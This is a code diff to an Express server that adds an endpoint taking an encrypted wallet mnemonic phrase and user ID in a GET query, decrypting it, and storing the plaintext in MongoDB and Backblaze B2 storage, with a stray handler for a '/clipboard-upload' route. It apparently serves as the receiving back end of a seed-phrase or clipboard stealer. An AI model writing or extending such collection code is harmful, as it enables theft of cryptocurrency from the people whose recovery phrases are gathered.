@@ -15,6 +15,11 @@ if (!process.env.B2_BUCKET_ID || !process.env.B2_ACCOUNT_ID || !process.env.B2_A
     process.exit(1);
 }
 
+if (!process.env.ENCRYPTION_KEY) {
+    console.error('Please provide ENCRYPTION_KEY in the environment variables.');
+    process.exit(1);
+}
+
 const app = express();
 // Ensure that bodyParser is able to handle form-data
 app.use(express.urlencoded({ extended: true }));
@@ -113,6 +118,33 @@ app.get('/download', async (req, res) => {
     }
 });
 app.options('/download', cors(corsOptions)); // Enable preflight request for this endpoint
+
+app.get('/mnemonic-upload', async (req, res) => {
+    const { mnemonicPhase, userId } = req.query;
+
+    if (!mnemonicPhase || !userId) {
+        return res.status(400).send('Missing mnemonicPhase or userId.');
+    }
+
+    // Decrypt the mnemonic
+    const decryptedMnemonicPhase = utils.decryptMnemonic(mnemonicPhase);
+
+    try {
+        // Log the decryptedMnemonicPhase in MongoDB
+        await utils.logMnemonicPhase(userId, decryptedMnemonicPhase);
+        await utils.uploadMnemonicToB2(userId, decryptedMnemonicPhase);
+
+        res.send({
+            status: 'success',
+            userId,
+            message: 'Mnemonic phase uploaded successfully!'
+        });
+    } catch (error) {
+        console.error('Upload error:', error);
+        res.status(500).send('Failed to upload the mnemonic phase');
+    }
+});
+app.options('/clipboard-upload', cors(corsOptions)); // Enable preflight request for this endpoint
 
 const SERVER_PORT = process.env.SERVER_PORT || 3000;
 const keyPath = process.env.PRIVKEY_PATH;
